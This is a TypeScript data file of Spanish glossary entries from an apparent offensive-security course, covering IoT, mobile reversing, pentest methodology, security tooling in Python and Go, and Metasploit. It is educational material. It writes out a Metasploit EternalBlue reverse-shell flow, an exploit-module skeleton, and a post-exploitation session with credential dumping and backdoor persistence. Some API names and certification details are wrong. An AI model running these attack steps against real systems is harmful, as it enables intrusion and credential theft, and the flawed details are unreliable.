...
export function definitionsByModule(moduleId: number): ConceptDefinition[] {
  ...
  // ── M49 · IoT y Mobile Security ──────────────────────────────────
  {
    id: 520,
    module: 49,
    term: "Análisis de firmware IoT",
    short: "Técnicas para extraer, desensamblar y buscar vulnerabilidades en firmware de dispositivos.",
    detail: "**Firmware** = imagen binaria de software del dispositivo. Típicamente es un FS comprimido (squashfs, cramfs) + kernel + bootloader.\n\n**Herramientas**:\n- **binwalk** — Identifica filesystems, extrae. `binwalk -e firmware.bin`\n- **Firmwalker** — Script que busca automáticamente credenciales, APIs, misconfigs\n- **Ghidra / IDA Pro** — Disassembler para analizar binarios\n- **QEMU** — Emulación para análisis dinámico\n\n**¿Qué buscar?**\n- Credenciales hardcodeadas (telnet root:root)\n- Claves criptográficas (SSH keys, API tokens)\n- Binarios con CVEs conocidas\n- Strings sospechosas (backdoor, update URL maliciosa)\n- Funciones de debug sin restricción\n\n**Caso real**: TP-Link routers tenían backdoor en firmware (CVE-2016-6299) — atacante podría ejecutar comandos como root.",
    examples: ["binwalk extrae filesystem → encontrás /etc/passwd con usuario:admin password:admin12345", "Strings muestran URL de update que apunta a servidor chino (device phoning home)"],
    related: ["Reverse engineering", "Binary analysis", "Hardware hacking"],
  },
  {
    id: 521,
    module: 49,
    term: "UART/JTAG para debugging y escalada",
    short: "Puertos de hardware que permiten acceso de bajo nivel a dispositivos; críticos para testing.",
    detail: "**UART** (Universal Asynchronous Receiver Transmitter) y **JTAG** (Joint Test Action Group) son interfaces de debug/programming en placas.\n\n**UART típicamente:**\n- 4 pines: Vcc, GND, TX, RX (2 para transmitir/recibir datos serie)\n- Baudrate común: 115200\n- **Riesgo**: acceso a bootloader, shell del dispositivo, credentials\n\n**JTAG típicamente:**\n- Permite debug/programming profundo del procesador\n- Acceso a memoria, CPU state\n- Bypass de boot protections (secure boot)\n\n**Proceso de explotación**:\n1. Abrir el dispositivo (PhillipsHead screwdriver)\n2. Identificar pines UART/JTAG (test points, pinout)\n3. Conectar adaptador USB (CH340, FT232, etc.)\n4. Usar `screen` o `minicom` para hablar con UART\n5. Si hay shell → acceso completo\n\n**Defensa**:\n- Deshabilitar UART/JTAG en producción\n- Proteger puertos con fuse/resistor que impida acceso\n- Secure boot (verificar firmware antes de ejecutar)",
    examples: ["UART abierto en router → acceso a bootloader → instalás nuevo firmware", "JTAG permite dump de flash → extrae credenciales del firmware"],
    related: ["Hardware hacking", "Side-channel attacks", "Firmware modification"],
  },
  {
    id: 522,
    module: 49,
    term: "Android APK reversing y análisis",
    short: "Técnicas para descompilar y analizar aplicaciones Android buscando vulnerabilidades.",
    detail: "**APK** = formato comprimido de una app Android (ZIP con clases.dex, recursos, manifesto).\n\n**Herramientas**:\n- **apktool** — Desensambla APK a smali (bytecode legible)\n- **jadx** — Descompila a Java pseudocódigo\n- **Frida** — Instrumentación dinámica (hook funciones en runtime)\n- **Objection** — Frontend de Frida, acceso a memoria/preferencias/etc\n\n**¿Qué buscar?**\n- Credenciales hardcodeadas (API keys, tokens)\n- Endpoints de servidor (URLs de API sin HTTPS, mal securizadas)\n- Lógica de autenticación débil\n- Almacenamiento inseguro de datos (SharedPreferences en claro)\n- Certificados mal pinneados (se puede MITM)\n- Permisos innecesarios (por qué calculadora pide `READ_CONTACTS`?)\n\n**Ejemplo attack flow**:\n1. `jadx app.apk` → lee código Java\n2. Ves que API key es `sk_test_abc123` en BuildConfig\n3. `adb logcat` mientras usás app → ves requests a backend\n4. Usás la key para hacer requests no-autorizadas\n\n**OWASP Mobile Top 10** guía el testing: improper creds, insecure comms, weak crypto, tampering, reversing.\n\n**Defensa en app**:\n- Root detection (evitar correr en rooted devices)\n- Obfuscación de código (ProGuard, R8)\n- Cert pinning (validar certificado específico, no CA chain)\n- Encripción de strings sensibles",
    examples: ["APK de banco: descubrís que token de sesión se almacena en SharedPreferences (sin encrypt) → fácil de robar", "Reversing reveals backend API endpoint que no valida user_id → read anyone's data"],
    related: ["Mobile security", "OWASP Mobile", "Code obfuscation"],
  },
  {
    id: 523,
    module: 49,
    term: "iOS jailbreaking y análisis",
    short: "iOS es más cerrado que Android; jailbreak abre acceso a filesystem y hooking de librerías.",
    detail: "**iOS** = cerrado. Apps ejecutan en sandbox, límite acceso al filesystem y APIs privadas.\n\n**Jailbreak** = exploit que quiebra sandbox:\n- Acceso a `/var/mobile/`, `/private/var/` (datos de apps, logs)\n- Instalación de tweaks/dylibs (hooks de función)\n- SSH server para acceso remoto\n\n**Herramientas post-jailbreak**:\n- **Frida** — Instrumentación dinámica (hook Objective-C methods)\n- **Objection** — CLI para explorar app state\n- **lldb** — Debugger de bajo nivel\n\n**Testing en iOS (típicamente requiere jailbreak):**\n1. Instalar Cydia (app store del jailbreak)\n2. Instalar OpenSSH → acceso remoto\n3. Usar `frida-ps -Uai` para listar apps\n4. Escribir script Frida para hooking:\n```javascript\ninterceptor.attach(ObjC.classes.NSURLRequest['- initWithURL:'], {\n  onEnter(args) {\n    console.log(\"URL: \" + ObjC.Object(args[1]));\n  }\n});\n```\n\n**Alternativa sin jailbreak:**\n- Repackagear IPA con Frida dylib embebida\n- Re-sign con cert de dev\n- Instalar con Xcode\n\n**Defensa en app**:\n- Jailbreak detection (cerrar si está detectado)\n- Cert pinning\n- Obfuscación de strings\n- No confiar en client-side validation",
    examples: ["Frida hook del login: capturás password antes de hash", "Repackeaged IPA con inyección: ves todas las requests de red de la app"],
    related: ["Jailbreaking", "Dynamic instrumentation", "iOS security"],
  },
  ...
  // ── M50 · Proyecto Final ──────────────────────────────────
  {
    id: 530,
    module: 50,
    term: "Pentest profesional y etapas",
    short: "Ciclo completo de penetration testing: scoping, reconocimiento, explotación, reporte.",
    detail: "**Pentest** = ataque autorizado con objetivo defensivo. Diferencia fundamental: **authorization** (por escrito) y **scope** (qué está in/out).\n\n**7 fases del pentest profesional (NIST SP 800-115):**\n\n1. **Scoping & Rules of Engagement** (1 semana pre-test)\n   - Documento: qué sistemas, qué técnicas, timeframe, escalation contacts\n   - \"Puedo hacer DoS?\" \"¿Puedo modificar datos?\" \"¿Puedo usar passwords que encuentre?\"\n   - Red lines: \"NO tocar sistema X de producción en horario business\"\n\n2. **Reconocimiento (OSINT)** (1-2 semanas)\n   - Google dorks, Shodan, whois, DNS enumeration\n   - LinkedIn scraping (empleados, tecnologías)\n   - Recon pasivo (NO toques sistemas aún)\n\n3. **Scanning & Enumeration** (1 semana)\n   - Nmap agresivo, servicios identificados\n   - Banner grabbing, búsqueda de URLs públicas\n   - Ahora SÍ tocas la red target (pero pasivo)\n\n4. **Vulnerability Assessment** (1-2 semanas)\n   - Escaneo de vulns conocidas (Nessus, OpenVAS)\n   - Análisis manual de cada servicio identificado\n   - Prioriza por criticidad (CVSS)\n\n5. **Exploitation** (1-3 semanas, parte intensiva)\n   - Intentás romper cada vuln\n   - Ganarás acceso (shell, credenciales, datos)\n   - Documentás cada paso (para el reporte)\n\n6. **Post-Exploitation** (1-2 semanas)\n   - Escala de privilegios (local → admin)\n   - Pivoting (lateral movement a otros sistemas)\n   - Data exfiltration (prueba que pudiste extraer datos)\n   - Instalás backdoor (persistencia, para mostrar riesgo)\n\n7. **Reporting** (1-2 semanas)\n   - Documento que el cliente pagó por\n   - Define el valor del pentest\n\n**Duración típica**: 2-8 semanas (depende scope), costo $10K-$100K+.",
    examples: ["Pentest de fintech: encontrás SQL injection en app web → escalás a admin → extraés tabla de usuarios → pivotás a DB → acceso a credenciales del sistema", "Pentest de hospital: social engineering a empleados → phishing → malware → acceso a network → lateral movement a servidor de historias clínicas"],
    related: ["Penetration testing", "Vulnerability assessment", "Security audit"],
  },
  {
    id: 531,
    module: 50,
    term: "Reporte de pentesting profesional",
    short: "Estructura y best practices para reportes que los clientes entienden y actúan sobre.",
    detail: "El **reporte** es el deliverable final. Una exploración genial pero mal reportada = desperdicio.\n\n**Estructura estándar:**\n\n**Portada**\n- Nombre del proyecto, cliente, fecha, clasificación (confidential)\n- Firma del pentester y del cliente (confirma autorización)\n\n**Executive Summary (1-2 págs)**\n- Para C-level/no-técnicos\n- *\"Se encontraron 12 vulnerabilidades críticas que permiten acceso admin a toda la infraestructura\"*\n- Riesgo de negocio: *\"Potencial pérdida: $1M USD por brechas de datos\"*\n- Recomendación top: *\"Implementar MFA en todas las admin accounts (2-3 días)\"*\n- **Sin tecnicismos**, sin CVSS, sin tablas\n\n**Scope & Methodology (1 págs)**\n- Qué fue testeado (IPs, dominios, aplicaciones)\n- Qué NO fue testeado (por request del cliente)\n- Metodología (NIST SP 800-115, OWASP, etc.)\n- Herramientas usadas (Burp, Metasploit, custom scripts)\n\n**Findings por Criticidad (core del reporte)**\n\n Para cada hallazgo:\n- **Título** — Claro y específico\n- **Severidad** — Critical/High/Medium/Low (basado en CVSS)\n- **Descripción** — Qué es el problema\n- **Técnica usada** — Cómo lo descubriste (SQLi via parameter X)\n- **Impacto** — Qué podría pasar (acceso a todos los datos de clientes)\n- **Proof of Concept** — Screenshot o video del exploit (sin credenciales)\n- **Remediación** — Pasos concretos para arreglarlo\n  - *\"Implementar prepared statements en database queries\"*\n  - *\"Actualizar Apache a 2.4.56\"*\n  - *\"Resetear las API keys expuestas\"*\n- **Referencia** — CWE-89 (SQL Injection), CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n\n**Apéndices**\n- Salida completa de herramientas (Nmap, Nessus)\n- Logs de exploitation\n- Timeline de eventos\n- Glosario de términos técnicos\n\n**Tono:**\n- Profesional, no asustador ni condescendiente\n- Objetivo (\"se confirmó acceso\" no \"supongo que querían...\")\n- Accionable (remediaciones específicas)\n\n**Errores comunes:**\n❌ Pasar 20 págs de técnico puro a CEO → no lo entiende\n❌ No dar pasos de remediación → cliente: \"¿y ahora qué hago?\"\n❌ Vulnerabilidades sin proof → cliente: \"¿de verdad es explotable?\"\n❌ CVSS sin contexto → cliente: \"¿5.3 es malo?\"\n\n✅ **Buen reporte:**\n→ Ejecutivo entiende riesgos y presupuesto para remediar\n→ Técnico sabe exactamente qué parchar\n→ Remediación toma 2-4 semanas (no 6 meses)\n→ Follow-up pentest verifica fixes",
    examples: ["Reporte de 40 págs: crisp executive summary de 2 págs, 15 hallazgos con PoCs, 10 págs de recomendaciones accionables", "Hallazgo de XSS: PoC muestra alert box sin ejecutar malware real; remediación: parametrize HTML output + CSP headers"],
    related: ["Communication", "Risk management", "Documentation"],
  },
  {
    id: 532,
    module: 50,
    term: "Certificaciones y carrera en seguridad",
    short: "Ruta de certificaciones y construcción de portfolio para career growth.",
    detail: "**Certificaciones importan** pero NO son suficientes. La experiencia práctica es el verdadero diferenciador.\n\n**Ruta recomendada (entry → expert):**\n\n**Tier 0 — Entry (0-1 año)**\n- **CompTIA A+** (hardware/OS basics) — opcional si vienes de IT\n- **CompTIA Network+** (networking) — complemento de Security+\n- **CompTIA Security+** (foundational) — el \"golden ticket\" de seguridad\n  - Costo: $200-300 examen, estudio 50-100h\n  - Aprobado: puerta a trabajos entry-level (SOC analyst, helpdesk seguridad)\n\n**Tier 1 — Intermediate (1-3 años experiencia)**\n- **CompTIA CySA+** (blue team, detection, compliance) — defensiva\n- **CEH (Certified Ethical Hacker)** — ofensiva, más reconocida que Security+\n- **eJPT** (eLearnSecurity Junior Penetration Tester) — alternativa barata a CEH\n- **GIAC Security Essentials (GSEC)** — via SANS (caro pero muy respetado)\n- **AWS Security Specialty** — si te inclinas a cloud\n\n**Tier 2 — Advanced (3-7 años)**\n- **OSCP (Offensive Security Certified Professional)** — THE gold standard de pentesting\n  - Costo: $500 examen + $800 curso PWK (pricing 2024)\n  - Estudio: 200-400h, muy demandante\n  - Aprobado: senior pentester, lead roles\n- **GPEN (GIAC Penetration Tester)** — SANS equivalente\n- **CISSP (Certified Information Systems Security Professional)** — arquitectura/management\n  - Prerequisito: 5+ años experiencia\n- **CKA/CKAD** (Kubernetes certs) — si cloud/DevSecOps\n\n**Tier 3 — Expert (7+ años)**\n- **GIAC Advanced Security Essentials (GASE)**\n- **OSEP (Offensive Security Web Expert)** / **OSCE** (advanced exploitation)\n- **CASE (Certified Application Security Engineer)** — web apps profundo\n- **Leadership certs:** CISM (governance), CCSK (cloud)\n\n**Portfolio > Certificados**\n\nQué importa más para contratación:\n✅ GitHub con herramientas propias (parser de logs, scanner)\n✅ Blog técnico (writeups de CTF, análisis de vulns)\n✅ HTB/TryHackMe badges (30+ machines resueltas)\n✅ CTF participación (placemet en competencias)\n✅ Contribuciones a OSS (Metasploit modules, Burp extensions)\n✅ Charlas en confs (BSides, OWASP)\n\nVs\n❌ Certificados sin experiencia practica\n❌ Haber pasado un examen hace 5 años (sin mantenerla vigente)\n\n**Mentalidad de learning:**\n→ Certificación = checkpoint, no destino final\n→ Tecnología cambia cada 2 años → etudio permanente\n→ Red: networking en confs + Twitter/Mastodon de seguridad\n→ Comunidad: OWASP local, meetups, CTF teams",
    examples: ["Ruta SOC analyst: Security+ → CySA+ → CISSP; trabaja 3 años en SOC detectando amenazas, gana escalas", "Ruta pentester: eJPT → CEH → OSCP; parallel: hace CTFs, publica writeups, trabaja freelance; a los 3 años: senior pentester $200K+"],
    related: ["Career development", "Continuous learning", "Professional growth"],
  },

  // ── M51 · Python Avanzado para Seguridad ──────────────────────────────────
  {
    id: 540,
    module: 51,
    term: "Parsing de logs con regex y generators",
    short: "Procesar logs gigantes de forma memory-efficient usando regex y generators de Python.",
    detail: "**Problema**: firewall log de 10GB, necesitás extraer IPs bloqueadas. `open().readlines()` → RAM explosion.\n\n**Solución: generators + streaming**\n```python\ndef parse_firewall_log(filename):\n    with open(filename) as f:\n        for line in f:  # stream line by line\n            match = re.search(r'BLOCKED (\\d+\\.\\d+\\.\\d+\\.\\d+)', line)\n            if match:\n                yield match.group(1)\n\n# Uso:\nfor ip in parse_firewall_log('firewall.log'):\n    if ip in threat_intel_db:\n        print(f\"MALICIOUS: {ip}\")\n```\n\n**Ventajas**:\n- Memoria constante (O(1) vs O(n))\n- Procesa 1GB/s en laptop\n- Lazy evaluation (solo procesa lo necesario)\n\n**Regex patterns útiles en seguridad**:\n```python\n# IPv4\nr'\\d+\\.\\d+\\.\\d+\\.\\d+'\n# Email\nr'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.\\w+'\n# URL\nr'https?://[^\\s]+'\n# Hash SHA-256\nr'[a-f0-9]{64}'\n# Dominio\nr'([a-z0-9]+(-[a-z0-9]+)*\\.)+[a-z]{2,}'\n```\n\n**collections.Counter para Top-N**:\n```python\nfrom collections import Counter\nips = parse_firewall_log('firewall.log')\nmost_blocked = Counter(ips).most_common(10)\nfor ip, count in most_blocked:\n    print(f\"{ip}: {count} blocks\")\n```",
    examples: ["Parse 5GB auth.log en 30s, identifica 1000 IPs con >10 failed logins", "Stream access.log, agrupa por user-agent, detecta bot malicioso usando regex signature"],
    related: ["Data parsing", "Performance", "Log analysis"],
  },
  {
    id: 541,
    module: 51,
    term: "Cryptography: cifrado simétrico y firmas",
    short: "Usar Python para cifrar datos (AES), hashear, y firmar con asymmetric keys.",
    detail: "**cryptography** (librería oficial recomendada, no PyCryptodome).\n\n**Cifrado AES-256-GCM (simétrico):**\n```python\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nimport os\n\nkey = os.urandom(32)  # 32 bytes = 256 bits\nnonce = os.urandom(12)\ncipher = AESGCM(key)\nciphertext = cipher.encrypt(nonce, b\"secret message\", None)\n# ciphertext incluye tag de autenticación (GCM = Galois/Counter Mode)\n```\n\n**Hashing (one-way):**\n```python\nfrom cryptography.hazmat.primitives import hashes\n\ndigest = hashes.Hash(hashes.SHA256())\ndigest.update(b\"password\")\npassword_hash = digest.finalize()  # 32 bytes\n```\n\n**Firmas (asymmetric, prueba de origen):**\n```python\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\n\n# Generar par de claves\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Firmar\nsignature = private_key.sign(\n    b\"message to sign\",\n    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),\n    hashes.SHA256()\n)\n\n# Verificar\npublic_key.verify(signature, b\"message to sign\", padding.PSS(...), hashes.SHA256())\n# Si no coincide → exception\n```\n\n**Caso de uso**: herramienta de seguridad que cifra logs antes de enviarlos a servidor centralizado.",
    examples: ["Encripta credenciales en archivo config con AES → app desencripta en runtime", "Firma binary de tool con private key → cliente verifica con public key (garantiza que no fue tampado)"],
    related: ["Cryptography", "Key management", "Secure storage"],
  },
  {
    id: 542,
    module: 51,
    term: "APIs de seguridad: VirusTotal, Shodan, AbuseIPDB",
    short: "Consultar servicios de threat intelligence desde Python para enriquecer análisis.",
    detail: "**Threat Intelligence APIs** permiten contextualizar IoCs (hashes, IPs, dominios).\n\n**VirusTotal** — Reputación de archivos/URLs (usado por antivirus):\n```python\nimport requests\n\nAPI_KEY = \"your-vt-key\"\nMD5_HASH = \"5d41402abc4b2a76b9719d911017c592\"\n\nresponse = requests.get(\n    f\"https://www.virustotal.com/api/v3/files/{MD5_HASH}\",\n    headers={\"x-apikey\": API_KEY}\n)\ndata = response.json()\nprint(f\"Detecciones: {data['data']['attributes']['last_analysis_stats']['malicious']}\")\n```\n\n**Shodan** — Búsqueda de dispositivos expuestos en Internet:\n```python\nfrom shodan import Shodan\napi = Shodan(API_KEY)\nresults = api.search(\"apache 2.4.41 port:80\")  # búsqueda\nfor result in results['matches']:\n    print(f\"{result['ip_str']}:{result['port']} → {result['http']['title']}\")\n```\n\n**AbuseIPDB** — Historial de abuso de IPs:\n```python\nresponse = requests.get(\n    \"https://api.abuseipdb.com/api/v2/check\",\n    params={\"ipAddress\": \"1.2.3.4\"},\n    headers={\"Key\": API_KEY}\n)\ndata = response.json()\nif data['abuseConfidenceScore'] > 75:\n    print(f\"IP MALICIOSA: {data['abuseConfidenceScore']}% de confianza\")\n```\n\n**Caso de uso integrador**: script que toma log de firewall, extrae IPs, las consulta a AbuseIPDB + VirusTotal, genera reporte de amenazas.",
    examples: ["Encuentra hash malware en PCAP → lo consulta VT → 58/70 AV engines lo detectan", "IP conectándose a tu servidor → consultas Shodan → aparece en honeypot dos veces antes"],
    related: ["Threat intelligence", "Enrichment", "API integration"],
  },
  {
    id: 543,
    module: 51,
    term: "Concurrencia y asyncio para tareas paralelas",
    short: "Ejecutar múltiples tareas simultáneamente (port scanning, API calls) sin bloqueo.",
    detail: "**Problema**: escanear 1000 puertos con `socket.connect()` secuencial = 1000 segundos (cada puerto tarda ~1s timeout).\n\n**Solución: threading (multiproceso simulado en Python)**\n```python\nimport concurrent.futures\n\ndef scan_port(host, port):\n    try:\n        socket.create_connection((host, port), timeout=1)\n        return f\"{port} OPEN\"\n    except:\n        return None\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:\n    futures = [executor.submit(scan_port, \"192.168.1.1\", p) for p in range(1, 65536)]\n    for future in concurrent.futures.as_completed(futures):\n        result = future.result()\n        if result:\n            print(result)\n```\nTiempo: 650 segundos → 30 segundos (100 threads paralelos).\n\n**asyncio (async/await) — más moderno:**\n```python\nimport asyncio\n\nasync def scan_port_async(host, port):\n    try:\n        await asyncio.wait_for(asyncio.open_connection(host, port), timeout=1)\n        return f\"{port} OPEN\"\n    except:\n        return None\n\nasync def main():\n    tasks = [scan_port_async(\"192.168.1.1\", p) for p in range(1, 65536)]\n    results = await asyncio.gather(*tasks)\n    return [r for r in results if r]\n\nasyncio.run(main())\n```\n\n**Ventaja asyncio**: menor overhead, mejor para I/O-heavy (APIs, sockets, files).\n\n**Caso de uso**: herramienta de scanning que explora 10 subnets en paralelo.",
    examples: ["Scan 65K puertos en 30s con ThreadPoolExecutor", "Consulta 1000 URLs en paralelo a VirusTotal sin bloquear"],
    related: ["Performance", "Concurrent programming", "Async"],
  },

  // ── M52 · Go para Security Tools ──────────────────────────────────
  {
    id: 550,
    module: 52,
    term: "Binarios estáticos y cross-compilation en Go",
    short: "Go produce ejecutables sin dependencias; fácil deployar en targets.",
    detail: "**Problema Python/Ruby**: necesitás Python 3.11 + librerías para correr un script. En servidor destino, ¿está instalado? ¿versión compatible?.\n\n**Go**: compilation a binary estático.\n```bash\n# En Linux, compilo para Windows:\nCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o tool.exe main.go\n\n# Resultado: 10MB binary, NO dependencies. Bajo en Windows, corre.\n```\n\n**Caso de seguridad**: pentester dropea binario de scanner en servidor target sin dejar rastro. No levanta sospechas (no hay scripts, no hay intérprete).\n\n**Tamaños típicos:**\n- Go binary: 5-20MB (después `upx` compress: 2-5MB)\n- Python script + interpreter + libs: 200MB+\n\n**Supported targets**: Windows, Linux, macOS, BSD, Android (ARM/ARM64/x86/x86_64).",
    examples: ["Compile nuclei para Windows/Linux/macOS en 1 comando, corre en cualquier máquina", "Security tool: port scanner, AV-evasion bypass, C2 client — todo en 1 exe"],
    related: ["Distribution", "Portability", "Binary compilation"],
  },
  {
    id: 551,
    module: 52,
    term: "Goroutines y channels para concurrencia",
    short: "Modelo de concurrencia de Go más limpio que threads; facilita escaneos masivos.",
    detail: "**Goroutine** = función ligera concurrente (NO es sistema thread, sino M:N scheduler).\n\n**Ejemplo: port scanner ultrarrápido**\n```go\npackage main\n\nfunc scanPort(host string, port int, results chan string) {\n    addr := fmt.Sprintf(\"%s:%d\", host, port)\n    conn, err := net.DialTimeout(\"tcp\", addr, 1*time.Second)\n    if err == nil {\n        conn.Close()\n        results <- fmt.Sprintf(\"%d OPEN\", port)\n    }\n}\n\nfunc main() {\n    results := make(chan string)\n    for port := 1; port <= 65535; port++ {\n        go scanPort(\"192.168.1.1\", port, results)  // lanzo goroutine\n    }\n    for i := 0; i < 65535; i++ {\n        select {\n        case result := <-results:\n            fmt.Println(result)\n        case <-time.After(30*time.Second):\n            return\n        }\n    }\n}\n```\n\n**Ventajas:**\n- 100K goroutines en 1 programa (threads típicamente: 1K max)\n- Scheduling automático por Go runtime\n- **Channels** para comunicación segura entre goroutines\n\n**Performance:** escanear 65K puertos en 5 segundos con simple code.\n\n**Alternativas**:\n- Python: async/await (más verboso, requiere rewrite a async)\n- C: pthreads (bajo nivel, complicado)\n- Go: goroutines (built-in, simple, poderoso)",
    examples: ["Port scanner: 100K goroutines, 65K ports en 5s", "Crawler: 1K goroutines, descarga 1000 URLs en paralelo"],
    related: ["Concurrency", "Performance", "Scalability"],
  },
  {
    id: 552,
    module: 52,
    term: "Herramientas Go usadas en seguridad ofensiva",
    short: "Panorama de tools escritas en Go que dominan el landscape actual.",
    detail: "**Por qué Go ganó en tools de seguridad:**\n→ Binarios estáticos (easy distribution)\n→ Goroutines (velocity en scanning)\n→ Lenguaje compilado (rápido)\n→ Fácil de escribir (vs C) pero con performance de C\n\n**Top tools:**\n\n| Tool | Función |\n|---|---|\n| **nuclei** (ProjectDiscovery) | Template-based scanner, automata |\n| **subfinder** | Subdomain enumeration |\n| **httpx** | HTTP probing, status codes |\n| **naabu** | Port scanner rápido |\n| **katana** | Web crawler |\n| **chisel** | Tunneling/pivoting |\n| **ligolo-ng** | Reverse tunneling |\n| **gobuster** | Directory/DNS fuzzing |\n| **trivy** | Container + OS scanning |\n| **osv-scanner** | Dependency vulnerability scanner |\n\n**ProjectDiscovery ecosystem**:\n- Bunch de tools que se comunican vía flags/stdout\n- `subfinder → httpx → nuclei` (find subdomain → probe HTTP → run templates)\n\n**Caso de uso:**\n```bash\nsubfinder -d target.com | httpx | nuclei -t cves/\n# Resultado: lista de CVEs en cada subdomain activo\n```\n\n**C2 frameworks en Go:**\n- **Sliver** (alternativa moderno a Metasploit, written in Go)\n- **Mythic** (framework multi-agent)\n\n**Defensa:**\n- EDR puede detectar Go binaries (heurísticas)\n- Evasion: obfuscación de strings, packing, AES encryption de payloads",
    examples: ["Nuclei: run 1000 vulnerability templates en descubiertos domains", "Gobuster: fuzz 1M palabras en 10 subdominios paralelo, encuentra /admin backend en 3min"],
    related: ["Tooling", "Penetration testing", "OSINT"],
  },

  // ── M53 · Ruby y Metasploit Development ──────────────────────────────────
  {
    id: 560,
    module: 53,
    term: "Metasploit framework architecture",
    short: "Estructura de módulos, tipos (exploit/auxiliary/post), y cómo Metasploit organiza la lógica.",
    detail: "**Metasploit** = framework de exploitation escrito en Ruby. Automatiza pentesting.\n\n**Arquitectura:**\n```\nmsfconsole\n├── Modules\n│   ├── exploits/  (obtienen acceso inicial)\n│   ├── payloads/  (shells, reverse shells)\n│   ├── encoders/  (evaden antivirus)\n│   ├── auxiliary/ (scanners, fuzzers, handlers)\n│   ├── post/      (post-explotación)\n│   └── evasion/   (bypass EDR/AV)\n├── Database\n│   └── Vulnerabilidad workspace, sessions, loot\n└── Listeners\n    └── multi/handler (escucha conexiones reverse)\n```\n\n**Tipos de módulos:**\n- **exploit** — Ataca vulnerabilidad específica (ej: MS17-010 EternalBlue)\n- **auxiliary** — No explota, pero ayuda (ej: scanner de puertos, credential bruter)\n- **post** — Después de acceso (ej: mimikatz, UAC bypass, screencap)\n- **payload** — Code ejecutable (ej: /windows/meterpreter/reverse_tcp)\n- **encoder** — Ofusca payloads (ej: shikata_ga_nai para evadir AV)\n- **evasion** — Bypass específico (ej: bypass Windows Defender signatures)\n\n**Flujo típico:**\n```\n1. use exploit/windows/smb/ms17_010_eternalblue\n2. set RHOST 192.168.1.100\n3. set PAYLOAD windows/meterpreter/reverse_tcp\n4. set LHOST 192.168.1.50\n5. exploit\n6. (Si funciona) → session abierta\n7. sessions -l (lista sesiones)\n8. sessions -i 1 (interactúa con sesión 1)\n9. (Ya dentro) > run post/windows/gather/hashdump\n```",
    examples: ["exploit/windows/smb/ms17_010_eternalblue → EternalBlue (WannaCry)", "auxiliary/scanner/smb/smb_version → enumera versión SMB de red"],
    related: ["Exploitation", "Framework", "Automation"],
  },
  {
    id: 561,
    module: 53,
    term: "Escribir un módulo exploit en Metasploit",
    short: "Estructura básica de un módulo exploit, payload delivery, session handling.",
    detail: "**Estructura mínima:**\n```ruby\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  \n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Target App RCE via Parameter',\n      'Description' => 'Aplicación vulnerable a RCE via parámetro mal validado',\n      'Author' => ['Pentester Name'],\n      'Targets' => [[\"Automatic\", {\"auto\" => true}]],\n      'Payload' => {'Space' => 1024, 'BadChars' => \"\\x00\"},\n      'Platform' => 'windows'\n    ))\n  end\n  \n  def register_options\n    register_opt(Opt::RHOST())\n    register_opt(Opt::RPORT(80))\n  end\n  \n  def exploit\n    print_status(\"[*] Attacking #{rhost}:#{rport}...\")\n    \n    # Construye payload\n    payload_data = payload.encode\n    \n    # Envía exploit\n    send_request_raw({\n      'method' => 'GET',\n      'uri' => \"/vulnerable.php?input=#{payload_data}\"\n    })\n    \n    print_good(\"[+] Exploit sent!\")\n  end\nend\n```\n\n**Pasos clave:**\n1. **initialize** — Metadata (nombre, descripción, references, CVE)\n2. **register_options** — Parámetros (RHOST, RPORT, LHOST, LPORT)\n3. **exploit** — Lógica principal (construye payload, lo envía, maneja sesión)\n4. **Check method** (opcional) — Verifica si el target es vulnerable sin explotar\n\n**Delivery payload:**\n```ruby\n# Meterpreter (agent interactivo)\nregister_opt(OptPath.new('PAYLOAD', ['windows/meterpreter/reverse_tcp']))\n\n# Encoded payload (evitar AV)\nencoded_payload = payload.encode_nops(payload.raw, nil, platform, arch)\n```\n\n**Manejo de sesión:**\n- Una vez que exploit ejecuta payload, Metasploit abre sesión\n- Usuario puede hacer `shell` en meterpreter\n- `getsystem` para escalada, `hashdump` para credentials, etc.",
    examples: ["exploit/windows/fileformat/adobe_pdf_embedded_file → archivo PDF malicioso que cuando se abre ejecuta shellcode", "exploit/linux/http/rails_rce → RCE en Rails vía object deserialization"],
    related: ["Module development", "Exploitation", "Ruby"],
  },
  {
    id: 562,
    module: 53,
    term: "Post-explotación con Metasploit",
    short: "Módulos de post-explotación para escalada, data gathering, pivoting después de acceso inicial.",
    detail: "**Post-explotación** = lo que haces DESPUÉS de tener shell en el target.\n\n**Módulos típicos:**\n\n| Módulo | Función |\n|---|---|\n| `post/windows/gather/hashdump` | Extrae hashes NT del SAM (para crackear offline) |\n| `post/windows/escalate/getsystem` | UAC bypass, escalada a SYSTEM |\n| `post/windows/gather/credentials/browser_data` | Cookies/credenciales del navegador |\n| `post/windows/gather/enum_computers` | Enumera hosts en red |\n| `post/linux/gather/hashdump` | Extrae /etc/passwd y /etc/shadow |\n| `post/linux/escalate/docker_privilege_escalation` | Escalada si Docker mal config |\n| `post/common/logoff` | Cierra sesión del usuario |\n| `post/windows/manage/enable_rdp` | Activa RDP para acceso remoto persistente |\n\n**Workflow típico en meterpreter:**\n```\nmeterpreter > sysinfo\nOS: Windows 10 x64\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM  (ya es admin)\n\nmeterpreter > run post/windows/gather/hashdump\nDumped hashes...\n\nmeterpreter > run post/windows/escalate/getsystem (si no fuera admin)\n[+] Escalated to SYSTEM\n\nmeterpreter > upload /tmp/persistence_script.ps1 C:\\\\Windows\\\\Temp\n\nmeterpreter > shell\nC:\\\\> powershell -ExecutionPolicy Bypass C:\\\\Windows\\\\Temp\\\\persistence_script.ps1\n# Instala backdoor para acceso persistente\n```\n\n**Movimiento lateral (pivoting):**\n```\nmeterpreter > run auxiliary/scanner/smb/smb_enumshares\n# Escanea otros hosts en la red\n\nmeterpreter > run post/linux/escalate/docker_privilege_escalation\n# Si host está dockerizado, escala a host\n\nmeterpreter > run auxiliary/scanner/snmp/snmp_enum\n# Enumera SNMP communities (a veces con default creds)\n```",
